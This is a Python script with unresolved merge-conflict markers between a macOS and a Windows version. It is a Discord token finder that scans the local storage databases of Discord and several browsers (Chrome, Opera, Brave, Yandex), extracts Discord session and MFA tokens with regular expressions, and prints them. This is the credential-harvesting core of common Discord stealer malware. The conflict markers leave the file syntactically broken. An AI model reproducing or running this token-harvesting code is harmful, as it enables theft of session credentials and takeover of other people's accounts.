import os
import re

from sys import platform
<<<<<<< HEAD
if platform != "darwin":
    input("WARNING: This program is only supported for macOS \nThere is no gaurantee on the functionality of this program on this device. \nPress enter to continue")
=======
if platform != "win32":
    input("WARNING: This program is only supported for Windows \nThere is no gaurantee on the functionality of this program on this device. \nPress enter to continue")
>>>>>>> master


class Token:
    def __init__(self, token, platform):
        self.token = token
        self.platform = platform


    def __str__(self):
        return self.token


class TokenFinder:
    def __init__(self):
        tokens = []
<<<<<<< HEAD
        appdata = f"/Users/{os.getlogin()}/Library/Application Support/"

        paths = {
        'Discord': appdata + 'discord',
        }

        for profile in self.get_google_profiles(appdata):
            paths["Google Chrome"] = profile

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
=======
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

>>>>>>> master
            for token in self.extract_tokens(path):
                tokens.append(Token(token, platform))

        self.tokens = tokens


    @staticmethod
    def extract_tokens(path):
<<<<<<< HEAD
        path += "/Local Storage/leveldb"
=======
        path += '\\Local Storage\\leveldb'

>>>>>>> master
        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            try:
<<<<<<< HEAD
                for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
=======
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
>>>>>>> master
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)
            except FileNotFoundError:
                pass
<<<<<<< HEAD
                
        return tokens


    @staticmethod
    def get_google_profiles(appdata):
        path = appdata + "Google/Chrome/"
        profiles = []

        for file in os.listdir(path):
            if file.startswith("Profile"):
                profiles.append(path+file)

        return profiles


=======
        return tokens


>>>>>>> master
    def to_list(self):
        return [token.token for token in self.tokens]


    def display(self):
        message = f"{len(self.to_list())} tokens found:"
        for token in self.tokens:
            message += "\n"
            message += f"{token.platform}: {token.token}"
        return message


if __name__ == "__main__":
    tokens = TokenFinder()
    print(tokens.display())
